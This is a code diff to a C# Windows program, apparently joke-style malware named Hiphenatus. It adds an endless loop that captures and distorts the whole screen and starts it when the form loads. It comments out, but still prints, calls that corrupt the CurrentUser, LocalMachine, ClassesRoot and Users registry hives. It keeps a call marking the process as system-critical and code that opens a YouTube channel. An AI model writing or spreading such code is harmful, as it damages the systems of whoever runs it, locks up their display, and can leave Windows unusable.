@@ -8,7 +8,7 @@ using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using static Hiphenatus.Bytebeats;
-using static Hiphenatus.Virus;
+//using static Hiphenatus.Virus;
 using static Hiphenatus.WinApi.APIs;
 
 namespace Hiphenatus
@@ -348,6 +348,59 @@ namespace Hiphenatus
             DeleteDC(hdc);
             DeleteDC(mdc);
         }
+        public static void Shader6()
+        {
+            int x = GetSystemMetrics(SM_CXSCREEN);
+            int y = GetSystemMetrics(SM_CYSCREEN);
+            int size = x * y;
+
+            IntPtr hdc = GetDC(IntPtr.Zero);
+            IntPtr mdc = CreateCompatibleDC(hdc);
+
+            BITMAPINFO bmi = new BITMAPINFO
+            {
+                bmiHeader = new BITMAPINFOHEADER
+                {
+                    biSize = (uint)Marshal.SizeOf(typeof(BITMAPINFOHEADER)),
+                    biWidth = x,
+                    biHeight = -y,
+                    biPlanes = 1,
+                    biBitCount = 24,
+                    biCompression = 0
+                },
+                bmiColors = new RGBQUAD[256]
+            };
+
+            IntPtr bitmap = CreateDIBSection(hdc, ref bmi, 0, out IntPtr ppvBits, IntPtr.Zero, 0);
+            IntPtr oldObject = SelectObject(mdc, bitmap);
+
+            byte[] rgbArray = new byte[size * 3]; // Each RGBTRIPLE has 3 bytes
+            int sigma = 1;
+            while (true)
+            {
+                BitBlt(mdc, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
+                Marshal.Copy(ppvBits, rgbArray, 0, rgbArray.Length);
+
+                Parallel.For(8, size, i =>
+                {
+                    rgbArray[i * 3 + 2] = (byte)(Math.Sqrt(rgbArray[i * 3 + 2]) * (i / (Math.Tan(sigma) * sigma)));
+                    rgbArray[i * 3 + 1] = (byte)(Math.Sqrt(rgbArray[i * 3 + 1]) * (i / (Math.Tan(sigma) * sigma)));
+                    rgbArray[i * 3 + 0] = (byte)(Math.Sqrt(rgbArray[i * 3 + 0]) * (i / (Math.Tan(sigma) * sigma)));
+
+                });
+                Marshal.Copy(rgbArray, 0, ppvBits, rgbArray.Length);
+                BitBlt(hdc, 0, 0, x, y, mdc, 0, 0, SRCERASE);
+                //ci(sigma, sigma, sigma*2, sigma*2);
+                sigma++;
+                Thread.Sleep(1);
+            }
+
+            SelectObject(mdc, oldObject);
+            ReleaseDC(IntPtr.Zero, hdc);
+            DeleteObject(bitmap);
+            DeleteDC(hdc);
+            DeleteDC(mdc);
+        }
         public void ci(int x, int y, int w, int h)
         {
             IntPtr hdc = GetDC(IntPtr.Zero);
@@ -438,7 +491,6 @@ namespace Hiphenatus
                 catch (Exception) { }
             }
         }
-
         public static void randEXELOOP(int ms)
         {
             while (true)
@@ -450,10 +502,10 @@ namespace Hiphenatus
         public void execPayload()
         {
             DefineAsCritical();
-            if (IS_THIS_BUILD_DESTRUCTIVE == "YES")
+            /*if (IS_THIS_BUILD_DESTRUCTIVE == "YES")
             {
                 Corrupt(Registry.CurrentUser);
-            }
+            }*/
 
             Process.Start("https://www.youtube.com/@sudoUltimateQuack");
 
@@ -471,11 +523,11 @@ namespace Hiphenatus
 
             ClearScreen();
 
-            if (IS_THIS_BUILD_DESTRUCTIVE == "YES")
+            /*if (IS_THIS_BUILD_DESTRUCTIVE == "YES")
             {
                 Corrupt(Registry.LocalMachine);
             }
-
+            */
             Process.Start("https://www.youtube.com/@sudoUltimateQuack");
 
             XDD.Abort();
@@ -495,10 +547,10 @@ namespace Hiphenatus
 
             ClearScreen();
 
-            if (IS_THIS_BUILD_DESTRUCTIVE == "YES")
+            /*if (IS_THIS_BUILD_DESTRUCTIVE == "YES")
             {
                 Corrupt(Registry.ClassesRoot);
-            }
+            }*/
 
             shader3Thread.Abort();
             bytebeat2.Abort();
@@ -515,10 +567,10 @@ namespace Hiphenatus
 
             ClearScreen();
 
-            if (IS_THIS_BUILD_DESTRUCTIVE == "YES")
+            /*if (IS_THIS_BUILD_DESTRUCTIVE == "YES")
             {
                 Corrupt(Registry.Users);
-            }
+            }*/
 
             shader4Thread.Abort();
             bytebeat3.Abort();
@@ -539,6 +591,7 @@ namespace Hiphenatus
 
         private void Form1_Load(object sender, EventArgs e)
         {
+            Shader6();
 #if DEBUG
             Console.WriteLine("Form1 loaded!");
 #endif
